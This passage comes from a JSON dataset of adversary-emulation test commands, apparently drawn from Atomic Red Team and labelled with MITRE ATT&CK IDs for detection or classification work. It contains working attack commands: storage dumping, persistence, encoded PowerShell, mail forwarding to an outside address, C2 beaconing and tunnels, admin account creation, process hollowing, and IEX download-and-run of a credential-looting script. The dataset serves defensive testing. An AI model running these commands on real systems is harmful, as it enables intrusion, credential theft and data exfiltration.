        "Description": "Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1530",
        "Shell": "powershell"
    },
    {
        "ID": 230,
        "Command": "try{$response = invoke-webrequest \"https://T1530Test2.blob.core.windows.net//\" -method \"GET\"}\ncatch [system.net.webexception]\n{if($_.Exception.Response -ne $null)\n{$Response = $_.Exception.Response.GetResponseStream()\n$ReadResponse = New-Object System.IO.StreamReader($Response)\n$ReadResponse.BaseStream.Position = 0\n$responseBody = $ReadResponse.ReadToEnd()}\nelse {$responseBody = \"The storage account could not be anonymously accessed.\"}}\n\"Response received for T1530Test2.blob.core.windows.net//: $responsebody\" | out-file -filepath $env:temp\\T1530Test2.txt -append\n",
        "Description": "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1530",
        "Shell": "powershell"
    },
    {
        "ID": 231,
        "Command": "aws --no-sign-request s3 cp --recursive s3://redatomic-test2 /tmp/redatomic-test2\n",
        "Description": "Upon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1530",
        "Shell": "sh"
    },
    {
        "ID": 232,
        "Command": "$storage_account_objects = Import-Csv -Path \"$env:temp\\T1619_storage_account_objects.csv\"\n\n# Login to Azure\naz login\n\nif (-not (Test-Path -Path \"$env:temp\\T1530_storage_account_objects\")) {\n\\tNew-Item -ItemType Directory -Path \"$env:temp\\T1530_storage_account_objects\"\n}\n\nforeach ($row in $storage_account_objects) {\n\\t\n\\tif ($row.FileShareName -ne \"\"){\n\\t\\t$allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query \"allowSharedKeyAccess\"\n\n\\t\\tif ($allowSharedKeyAccess -eq \"false\") {\\t# $allowSharedKeyAccess could be true or null\n\\t\\t\\tWrite-Output \"Shared key access is disabled for this storage account.\"\n\\t\\t} else {\n\\t\\t\\tWrite-Output \"Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...\"\n\\t\\t\\t$connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv\n\\t\\t\\t\n\\t\\t\\t# Create folder for storage account objects\n\\t\\t\\t$storageAccountOutputPath = Join-Path $env:temp\\T1530_storage_account_objects \"$($row.ResourceGroup)_$($row.StorageAccountName)\"\n\\t\\t\\tif (-not (Test-Path -Path $storageAccountOutputPath)) {\n\\t\\t\\t\\tNew-Item -ItemType Directory -Path $storageAccountOutputPath\n\\t\\t\\t}\n\n\\t\\t\\t# create folder for file share content\n\\t\\t\\t$fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName\n\\t\\t\\tif (-not (Test-Path -Path $fileSharePath)) {\n\\t\\t\\t\\tNew-Item -ItemType Directory -Path $fileSharePath\n\\t\\t\\t}\n\\t\\t\\taz storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath\n\\t\\t}\n\\t} elseif ($row.ContainerName -ne \"\" -and $row.BlobName -eq \"\") {\n\\t\\t$allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query \"allowSharedKeyAccess\"\n\n\\t\\tif ($allowSharedKeyAccess -eq \"false\") {\\t# $allowSharedKeyAccess could be true or null\n\\t\\t\\tWrite-Output \"Shared key access is disabled for this storage account.\"\n\\t\\t} else {\n\\t\\t\\tWrite-Output \"Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...\"\n\\t\\t\\t$connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv\n\\t\\t\\t\n\\t\\t\\t# Create folder for storage account objects\n\\t\\t\\t$storageAccountOutputPath = Join-Path $env:temp\\T1530_storage_account_objects \"$($row.ResourceGroup)_$($row.StorageAccountName)\"\n\\t\\t\\tif (-not (Test-Path -Path $storageAccountOutputPath)) {\n\\t\\t\\t\\tNew-Item -ItemType Directory -Path $storageAccountOutputPath\n\\t\\t\\t}\n\n\\t\\t\\t# create folder for blob content\n\\t\\t\\t$containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName\n\\t\\t\\tif (-not (Test-Path -Path $containerFolderPath)) {\n\\t\\t\\t\\tNew-Item -ItemType Directory -Path $containerFolderPath\n\\t\\t\\t}\n\\t\\t\\taz storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString\n\\t\\t}\n\\t}\n}",
        "Description": "This test dumps the content of the storage account objects present in the file defined in file_shares_csv_file_path. Note that this file is created in the atomic test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\". When created manually, it must contain the columns \"ResourceGroup\",\"StorageAccountName\", \"FileShareName\", \"ContainerName\", \"BlobName\".\n\nRequirements:\n    - The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n    - The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1530",
        "Shell": "powershell"
    },
    {
        "ID": 233,
        "Command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy C:\\Windows\\System32\\cmd.exe \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif 0 NEQ 0 shutdown /r /t 0\n",
        "Description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 234,
        "Command": "wmic useraccount get /ALL /format:csv\n",
        "Description": "An adversary might use WMI to list all local User Accounts. \nWhen the test completes , there should be local user accounts information displayed on the command line.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1047",
        "Shell": "command_prompt"
    },
    {
        "ID": 235,
        "Command": "wmic process get caption,executablepath,commandline /format:csv\n",
        "Description": "An adversary might use WMI to list Processes running on the compromised host.\nWhen the test completes , there should be running processes listed on the command line.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1047",
        "Shell": "command_prompt"
    },
    {
        "ID": 236,
        "Command": "wmic qfe get description,installedOn /format:csv\n",
        "Description": "An adversary might use WMI to list installed Software hotfix and patches.\nWhen the test completes, there should be a list of installed patches and when they were installed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1047",
        "Shell": "command_prompt"
    },
    {
        "ID": 237,
        "Command": "wmic /node:\"127.0.0.1\" service where (caption like \"%Spooler%\")\n",
        "Description": "An adversary might use WMI to check if a certain Remote Service is running on a remote device. \nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" \nif the provided remote host is unreachable\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1047",
        "Shell": "command_prompt"
    },
    {
        "ID": 238,
        "Command": "wmic process call create notepad.exe\n",
        "Description": "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1047",
        "Shell": "command_prompt"
    },
    {
        "ID": 239,
        "Command": "wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process call create notepad.exe\n",
        "Description": "This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.\nTo clean up, provide the same node input as the one provided to run the test\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" if the default or provided IP is unreachable\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1047",
        "Shell": "command_prompt"
    },
    {
        "ID": 240,
        "Command": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA\n",
        "Description": "Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand\n Powershell -nop -exec bypass -EncodedCommand <encoded command>\nWhere the –EncodedCommand, once decoded, would resemble:\n  Invoke-WMIMethod win32_process -name create -argumentlist ‘rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs’ -ComputerName WORKSTATION\nThe EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe\nYou should expect to see notepad.exe running after execution of this test.\n[Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1047",
        "Shell": "command_prompt"
    },
    {
        "ID": 241,
        "Command": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\"))\n$NewClass = $Class.Derive(\"Win32_Atomic\")\n$NewClass.Put()\nInvoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe\n",
        "Description": "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1047",
        "Shell": "powershell"
    },
    {
        "ID": 242,
        "Command": "wmic /node:127.0.0.1 process call create \"rundll32.exe \\\"PathToAtomicsFolder\\..\\ExternalPayloads\\calc.dll\\\" StartW\"\n",
        "Description": "This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1047",
        "Shell": "command_prompt"
    },
    {
        "ID": 243,
        "Command": "wmic /node:\"127.0.0.1\" product where \"name like 'Tightvnc%%'\" call uninstall",
        "Description": "Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1047",
        "Shell": "command_prompt"
    },
    {
        "ID": 244,
        "Command": "$secure_pwd = \"\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"Atomic Red Team Email Rule\" -ForwardTo \"Atomic_Operator@fakeemail.aq\"\n",
        "Description": "Creates a new Inbox Rule to forward emails to an external user via the \"ForwardTo\" property of the New-InboxRule Powershell cmdlet.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1114.003",
        "Shell": "powershell"
    },
    {
        "ID": 245,
        "Command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\" -OutFile \"$env:TEMP\\qbot-test.iso\")\nMount-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\"\n$mountedpath = (Get-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\" | Get-Volume).DriveLetter\n$finalpath = $mountedpath + \":\\\"\ncd $finalpath\n.\\calc.exe.lnk",
        "Description": "Adversaries may rely on a user running a malicious image to facilitate execution",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.003",
        "Shell": "powershell"
    },
    {
        "ID": 246,
        "Command": "for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \"https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\" -UseBasicParsing).Content }\n",
        "Description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1572",
        "Shell": "powershell"
    },
    {
        "ID": 247,
        "Command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30\n",
        "Description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1572",
        "Shell": "powershell"
    },
    {
        "ID": 248,
        "Command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT\n",
        "Description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1572",
        "Shell": "powershell"
    },
    {
        "ID": 249,
        "Command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N/A | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n",
        "Description": "Download and run ngrok. Create tunnel to chosen port.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1572",
        "Shell": "powershell"
    },
    {
        "ID": 250,
        "Command": "PathToAtomicsFolder/../ExternalPayloads/devtunnel host -p 8080 &\n",
        "Description": "Dev Tunnels enables insiders as well as threat actors to expose local ports over the internet via Microsoft dev tunnels.\n\nThis atomic will generate a dev tunnel binding it to the local service running on the provided port. Can be used to expose local services, web applications and local files etc.\nReference:\n- [Microsoft Docs](https://learn.microsoft.com/en-us/tunnels/dev-tunnels-overview)\n- [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/devtunnels/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1572",
        "Shell": "bash"
    },
    {
        "ID": 251,
        "Command": "nohup code tunnel --accept-server-license-terms  >/dev/null 2>&1 &\n",
        "Description": "Visual Studio Code Remote Tunnels can be used for exposing local development environment/services/files over the internet.\nThis atomic will generate a dev tunnel binding it to the local service running on the provided port.\nReference:\n- [Microsoft Docs](https://code.visualstudio.com/docs/remote/tunnels)\n- [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/vscode-server/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1572",
        "Shell": "sh"
    },
    {
        "ID": 252,
        "Command": "nohup PathToAtomicsFolder/../ExternalPayloads/cloudflared tunnel --url localhost:8080  >/dev/null 2>&1 &\n",
        "Description": "Cloudflared can be used for exposing local development environment/services/files over the internet.\nThis atomic will generate a dev tunnel binding it to the local service running on the provided port.\nReference:\n- [Cloudflared Docs](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/)\n- [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/cloudflared/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1572",
        "Shell": "sh"
    },
    {
        "ID": 253,
        "Command": "net user \"T1136.002_Admin\" \"T1136_pass123!\" /add /domain\nnet group \"Domain Admins\" \"T1136.002_Admin\" /add /domain\n",
        "Description": "Creates a new domain admin user in a command prompt.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 254,
        "Command": "net user \"ANONYMOUS  LOGON\" \"T1136_pass123!\" /add /domain\n",
        "Description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 255,
        "Command": "$SamAccountName = 'T1136.002_Admin'\n$AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force\nAdd-Type -AssemblyName System.DirectoryServices.AccountManagement\n$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)\n$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)\n$User.SamAccountName = $SamAccountName\n$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)\n$User.SetPassword($TempCred.GetNetworkCredential().Password)\n$User.Enabled = $True\n$User.PasswordNotRequired = $False\n$User.DisplayName = $SamAccountName\n$User.Save()\n$User\n",
        "Description": "Creates a new Domain User using the credentials of the Current User\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.002",
        "Shell": "powershell"
    },
    {
        "ID": 256,
        "Command": "echo \"dn: CN=Admin User,CN=Users,DC=example,DC=test\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@example.test\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=example,DC=test\" > tempadmin.ldif\necho ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif\nldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif\n",
        "Description": "Use Admin Credentials to Create A Domain Admin Account\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.002",
        "Shell": "sh"
    },
    {
        "ID": 257,
        "Command": "echo \"dn: cn=Atomic User, cn=Users,dc=example,dc=test\\nobjectClass: person\\ncn: Atomic User\\nsn: User\" > tempadmin.ldif\necho ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif\nldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif\n",
        "Description": "Use Admin Credentials to Create A Normal Account (as means of entry)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.002",
        "Shell": "sh"
    },
    {
        "ID": 258,
        "Command": "\"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe\"\n",
        "Description": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1072",
        "Shell": "command_prompt"
    },
    {
        "ID": 259,
        "Command": "\"%PROGRAMFILES(x86)%/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe\"\n",
        "Description": "An adversary may use PDQ Deploy Software to deploy the Remote Adminstartion Tool, this will start the PDQ console.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1072",
        "Shell": "command_prompt"
    },
    {
        "ID": 260,
        "Command": "# Deploy 7-Zip using Chocolatey\nchoco install -y 7zip\n",
        "Description": "An adversary may use Chocolatey to remotely deploy the 7-Zip file archiver utility.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1072",
        "Shell": "powershell"
    },
    {
        "ID": 261,
        "Command": "Start-Process \"PathToAtomicsFolder\\T1055.002\\bin\\RedInjection.exe\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "Description": "This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title \"Warning\" and the content \"Atomic Red Team\" after a few seconds.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.002",
        "Shell": "powershell"
    },
    {
        "ID": 262,
        "Command": "kubectl get cronjobs -n default\n",
        "Description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.007",
        "Shell": "bash"
    },
    {
        "ID": 263,
        "Command": "kubectl create -f src/cronjob.yaml -n default\n",
        "Description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.007",
        "Shell": "bash"
    },
    {
        "ID": 264,
        "Command": "# Check for common debugger processes\n$debuggerProcesses = Get-Process | Where-Object { $_.ProcessName -match \"dbg\" -or $_.ProcessName -match \"debug\" }\n# Check for debugging flags\n$debuggingFlags = [System.Diagnostics.Debugger]::IsAttached ",
        "Description": "Detecting a running debugger process or if the debugger is attached to a process via PowerShell",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1622",
        "Shell": "powershell"
    },
    {
        "ID": 265,
        "Command": "net user art-test /add\nnet user art-test -4RTisCool!-321\nnet localgroup administrators art-test /add",
        "Description": "After execution the new account will be active and added to the Administrators group",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 266,
        "Command": "dscl . -create /Users/AtomicUser\ndscl . -create /Users/AtomicUser UserShell /bin/bash\ndscl . -create /Users/AtomicUser RealName \"Atomic User\"\ndscl . -create /Users/AtomicUser UniqueID 503\ndscl . -create /Users/AtomicUser PrimaryGroupID 503\ndscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser\ndscl . -passwd /Users/AtomicUser mySecretPassword\ndscl . -append /Groups/admin GroupMembership AtomicUser",
        "Description": "After execution the new account will be active and added to the Administrators group",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "bash"
    },
    {
        "ID": 267,
        "Command": "sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin",
        "Description": "After execution the new account will be active and added to the Administrators group",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "bash"
    },
    {
        "ID": 268,
        "Command": "dsenableroot #current user\ndsenableroot -u art-tester -p art-tester -r art-root #new user",
        "Description": "After execution the current/new user will have root access",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "bash"
    },
    {
        "ID": 269,
        "Command": "dseditgroup -o edit -a art-user -t user admin",
        "Description": "After execution the current/new user will be added to the Admin group",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "bash"
    },
    {
        "ID": 270,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nobfuskittiedump -consoleoutput -noninteractive",
        "Description": "Loot local Credentials - powerhell kittie technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "powershell"
    },
    {
        "ID": 271,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive",
        "Description": "Loot local Credentials - Safetykatz technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "powershell"
    },
    {
        "ID": 272,
        "Command": "password=$(openssl passwd -1 art)\n([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))\nsu art -c \"whoami; exit\"\n",
        "Description": "An adversary may wish to create an account with admin privileges to work with. In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "bash"
    },
    {
        "ID": 273,
        "Command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art\nusermod --lock art\nusermod --expiredate \"1\" art\nusermod --unlock art\nusermod --expiredate \"99999\" art\nsu -c whoami art\n",
        "Description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "bash"
    },
    {
        "ID": 274,
        "Command": "pw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\npw lock art\npw usermod art -e +1d\npw unlock art\npw user mod art -e +99d\nsu art\nwhoami\nexit\n",
        "Description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "sh"
    },
    {
        "ID": 275,
        "Command": "cat /etc/passwd |grep nobody\nchsh --shell /bin/bash nobody\nusermod --password $(openssl passwd -1 nobody) nobody\nsu -c \"whoami\" nobody\n",
        "Description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin. Here is how the nobody entry should look like in `/etc/passwd` before the test is executed and right after the cleanup: `# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "bash"
    },
    {
        "ID": 276,
        "Command": "cat /etc/passwd |grep nobody\npw usermod nobody -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user nobody -h 0\nsu nobody\nwhoami\nexit\n",
        "Description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin. Here is how the nobody entry should look like in `/etc/passwd` before the test is executed and right after the cleanup: `# -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin`\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "sh"
    },
    {
        "ID": 277,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami\n",
        "Description": "PsExec is a powerful tool most known for its remote management capability. However, it can also be used to run processes as the local system account.\n\nThe local system account is a default windows account which has unrestricted access to all system resources.\n\nUpon successful execution, PsExec.exe will spawn a command prompt which will run 'whoami' as the local system account and then exit.    \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 278,
        "Command": ". \"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\"\n$ppid=Get-Process explorer | select -expand id\nStart-Hollow -Sponsor \"C:\\Windows\\System32\\notepad.exe\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose\n",
        "Description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.012",
        "Shell": "powershell"
    },
    {
        "ID": 279,
